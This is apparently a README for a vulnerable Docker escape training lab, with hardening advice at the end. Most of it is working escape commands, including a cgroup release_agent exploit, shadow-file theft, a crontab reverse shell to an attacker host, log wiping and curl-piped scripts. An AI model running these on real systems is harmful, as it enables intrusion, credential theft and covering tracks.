# Docker Escape Lab

## Overview
Docker Escape Lab is a vulnerable container environment designed to practice container escape techniques and understand Docker security misconfigurations.

## Quick Start

**SSH Access**: `ssh user@localhost -p 2222`

**Default Credentials**:
- Username: `user`
- Password: `escape`

**Container Access**:
- Once logged in via SSH, you'll be inside a Docker container
- Goal: Escape to the host system

## Container Information

### Initial Reconnaissance
```bash
# Check if you're in a container
cat /proc/1/cgroup

# Docker socket check
ls -la /var/run/docker.sock

# Kernel information
uname -a

# Check capabilities
capsh --print
```

## Escape Techniques

### 1. Privileged Container Escape
If the container is running with `--privileged` flag:
```bash
# Check if privileged
cat /proc/self/status | grep CapEff

# Mount host filesystem
mkdir /tmp/escape
mount /dev/sda1 /tmp/escape
chroot /tmp/escape
```

### 2. Docker Socket Escape
If Docker socket is mounted:
```bash
# Check for docker socket
ls -la /var/run/docker.sock

# Use docker from inside container
docker run -it -v /:/host ubuntu chroot /host

# Or create a privileged container
docker run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```

### 3. Capability Exploitation
Common dangerous capabilities:
```bash
# CAP_SYS_ADMIN - Mount escape
mount -t cgroup -o rdma cgroup /tmp/cgroup
echo 1 > /tmp/cgroup/notify_on_release
echo "$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)/exploit" > /tmp/cgroup/release_agent
echo '#!/bin/sh' > /exploit
echo 'cat /etc/shadow > /tmp/shadow' >> /exploit
chmod +x /exploit
sh -c "echo \$\$ > /tmp/cgroup/cgroup.procs"

# CAP_SYS_PTRACE - Process injection
# Find host processes
grep -E "^CapEff:\s*[0-9a-fA-F]+$" /proc/*/status
```

### 4. Volume Mount Escape
If sensitive host paths are mounted:
```bash
# Check mounted volumes
mount | grep -E "^/dev"
df -h

# Look for host filesystem
find / -name "*.ssh" 2>/dev/null
find / -name "shadow" 2>/dev/null
```

### 5. Kernel Exploit
For older kernels:
```bash
# Dirty COW (CVE-2016-5195)
# Check kernel version
uname -r

# If vulnerable (< 4.8.3)
gcc -pthread dirty.c -o dirty -lcrypt
./dirty password
```

### 6. Container Runtime Exploits
```bash
# runC exploit (CVE-2019-5736)
# Check runC version
runc --version

# If vulnerable (< 1.0-rc7)
# Overwrite runc binary when exec'd
```

### 7. Shared Namespace Escape
```bash
# Check namespaces
ls -la /proc/self/ns/

# If PID namespace is shared
ps aux | grep -v "PID\|ps aux"

# If network namespace is shared
ip addr show
```

### 8. Systemd Exploit
If systemd is accessible:
```bash
# Create malicious service
echo '[Service]
Type=oneshot
ExecStart=/bin/bash -c "cat /etc/shadow > /tmp/shadow"
[Install]
WantedBy=multi-user.target' > /tmp/evil.service

# Try to install
systemctl link /tmp/evil.service
systemctl start evil
```

## Post-Exploitation

### Once Escaped
```bash
# Verify escape
hostname
id
cat /etc/shadow

# Persistence
echo "* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'" >> /etc/crontab

# Cover tracks
history -c
echo > /var/log/auth.log
```

## Common Misconfigurations

1. **Privileged Containers**: `--privileged` flag
2. **Docker Socket Mount**: `-v /var/run/docker.sock:/var/run/docker.sock`
3. **Dangerous Capabilities**: `--cap-add=SYS_ADMIN`
4. **Host Network**: `--network=host`
5. **Host PID**: `--pid=host`
6. **Sensitive Mounts**: `-v /:/host`

## Detection and Prevention

### What's Missing (Security Controls)
- ❌ Restricted capabilities
- ❌ Read-only root filesystem
- ❌ Non-root user
- ❌ Security profiles (AppArmor/SELinux)
- ❌ Network policies
- ❌ Resource limits
- ❌ Audit logging

### Secure Configuration Example
```bash
docker run \
  --rm \
  --read-only \
  --security-opt no-new-privileges \
  --cap-drop ALL \
  --user 1000:1000 \
  --memory="256m" \
  --cpus="0.5" \
  myapp
```

## Learning Objectives
- Understanding container isolation
- Recognizing dangerous configurations
- Container escape techniques
- Post-exploitation in containerized environments
- Container security best practices

## Tools for Container Security

### Inside Container
```bash
# LinPEAS - Linux privilege escalation
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# pspy - Monitor processes without root
./pspy64

# Container escape checker
curl -L https://github.com/PercussiveElbow/docker-escape-tool/raw/master/docker-escape-check.sh | sh
```

### From Host
```bash
# Docker Bench Security
docker run -it --net host --pid host --userns host --cap-add audit_control \
  -e DOCKER_CONTENT_TRUST=$DOCKER_CONTENT_TRUST \
  -v /var/lib:/var/lib \
  -v /var/run/docker.sock:/var/run/docker.sock \
  --label docker_bench_security \
  docker/docker-bench-security
```

## Additional Resources
- [Container Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html)
- [Docker Escape Techniques](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
- [CIS Docker Benchmark](https://www.cisecurity.org/benchmark/docker) 